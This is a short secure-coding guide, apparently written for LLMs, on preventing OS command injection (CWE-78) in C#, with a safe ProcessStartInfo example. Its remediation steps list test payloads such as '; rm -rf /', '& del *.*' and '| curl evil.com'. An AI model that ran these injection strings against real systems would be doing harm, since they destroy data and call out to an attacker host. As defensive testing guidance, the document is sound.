# CWE-78: OS Command Injection - C\#

## LLM Guidance

OS Command Injection occurs when untrusted data is incorporated into operating system commands without proper validation, allowing attackers to execute arbitrary commands.

**Primary Defence:** Use .NET native APIs (File, Directory, HttpClient) instead of system commands. If unavoidable, use `ProcessStartInfo.ArgumentList` (.NET 6+) with `UseShellExecute = false`.

## Key Principles

- Eliminate the risk: Use .NET native APIs instead of Process.Start() whenever possible
- Disable shell execution: Set `UseShellExecute = false` to prevent shell interpretation
- Use ArgumentList: Prefer `ProcessStartInfo.ArgumentList` (.NET 6+) over command strings
- Validate inputs: Allowlist permitted characters as defence-in-depth (never rely on validation alone)
- Apply least privilege: Run processes with minimal permissions

## Remediation Steps

- Check if a .NET API exists (File.Copy, Directory.Delete, HttpClient, etc.) and use it
- If commands are unavoidable, migrate to `ProcessStartInfo.ArgumentList` property
- Set `UseShellExecute = false` on ProcessStartInfo
- Implement allowlist validation for any user inputs (alphanumeric, specific characters only)
- Run processes with least-privilege service accounts
- Test with malicious inputs - `; rm -rf /`, `& del *.*`, `| curl evil.com`

## Safe Pattern

```csharp
// SAFE: Using ArgumentList with UseShellExecute = false
var startInfo = new ProcessStartInfo
{
    FileName = "ping",
    UseShellExecute = false,
    RedirectStandardOutput = true
};
startInfo.ArgumentList.Add("-n");
startInfo.ArgumentList.Add("4");
startInfo.ArgumentList.Add(userInput); // Safely passed as argument

using var process = Process.Start(startInfo);
```
